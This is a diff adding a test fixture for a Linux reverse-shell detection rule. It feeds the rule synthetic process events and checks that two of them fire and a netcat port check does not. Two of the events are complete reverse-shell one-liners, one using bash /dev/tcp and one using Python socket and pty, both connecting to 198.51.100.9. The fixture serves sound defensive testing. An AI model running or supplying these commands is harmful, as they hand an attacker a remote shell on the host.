@@ -1,0 +1,14 @@
+rule: detections/linux-reverse-shell.yaml
+description: A bash /dev/tcp shell and a Python pty shell fire; a netcat port check doesn't.
+data:
+  DeviceProcessEvents:
+    - {ago: 10m, DeviceName: lnx-app-01, AccountName: tomcat, FileName: bash, ProcessCommandLine: "bash -c 'bash -i >& /dev/tcp/198.51.100.9/4444 0>&1'", InitiatingProcessFileName: java}
+    - {ago: 10m, DeviceName: lnx-app-02, AccountName: www-data, FileName: python3, ProcessCommandLine: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"198.51.100.9\",443));os.dup2(s.fileno(),0);import pty;pty.spawn(\"/bin/sh\")'", InitiatingProcessFileName: php-fpm}
+    - {ago: 10m, DeviceName: lnx-ops-01, AccountName: ops, FileName: nc, ProcessCommandLine: "nc -zv db01 5432", InitiatingProcessFileName: bash}
+expect:
+  rows: 2
+  include:
+    - {DeviceName: lnx-app-01}
+    - {DeviceName: lnx-app-02}
+  exclude:
+    - {DeviceName: lnx-ops-01}
